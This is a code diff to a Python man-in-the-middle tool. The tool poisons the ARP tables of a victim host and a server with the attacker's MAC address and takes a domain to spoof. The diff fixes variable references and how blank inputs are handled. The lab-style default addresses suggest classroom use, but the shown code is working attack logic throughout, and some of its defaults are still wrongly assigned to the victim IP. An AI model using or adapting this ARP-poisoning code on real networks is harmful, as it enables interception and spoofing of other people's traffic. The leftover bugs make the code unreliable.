@@ -94,18 +94,18 @@ class DefaultTool:
             # Poison the victim's ARP table
             victim_arp[Ether].src = attacker_mac
             victim_arp[ARP].hwsrc = attacker_mac
-            victim_arp[ARP].psrc = server_ip
+            victim_arp[ARP].psrc = self.server_ip
             victim_arp[ARP].hwdst = victim_mac
-            victim_arp[ARP].pdst = victim_ip
+            victim_arp[ARP].pdst = self.victim_ip
             print("poisoned victim arp table")
             sendp(victim_arp, iface=self.network_interface)
 
             # Poison the server's ARP table
             server_arp[Ether].src = attacker_mac
             server_arp[ARP].hwsrc = attacker_mac
-            server_arp[ARP].psrc = victim_ip
+            server_arp[ARP].psrc = self.victim_ip
             server_arp[ARP].hwdst = server_mac
-            server_arp[ARP].pdst = server_ip
+            server_arp[ARP].pdst = self.server_ip
             print("poisoned server arp table")
             sendp(server_arp, iface=self.network_interface)
 
@@ -143,20 +143,20 @@ ip_attacker = input("enter IPv4 Address of the attacker: ")
 domain_to_spoof = input("enter domain you want to spoof: ")
 network_interface = input("enter the network interface: ")
 
-if ip_victim is None:
+if not ip_victim.strip():
     ip_victim = "192.168.56.101"
 
-if ip_server is None:
+if not ip_server.strip():
     ip_victim = "192.168.56.102"
 
-if ip_attacker is None:
+if not ip_attacker.strip():
     ip_victim = "192.168.56.103"
 
-if domain_to_spoof is None:
+if not domain_to_spoof.strip():
     domain_to_spoof = input("domain to spoof is required: ")
 
-if network_interface is None:
-    ip_victim = "enp0s3"
+if not network_interface.strip():
+    network_interface = "enp0s3"
 
 tool = DefaultTool(
     ip_victim, ip_server, ip_attacker, domain_to_spoof, network_interface
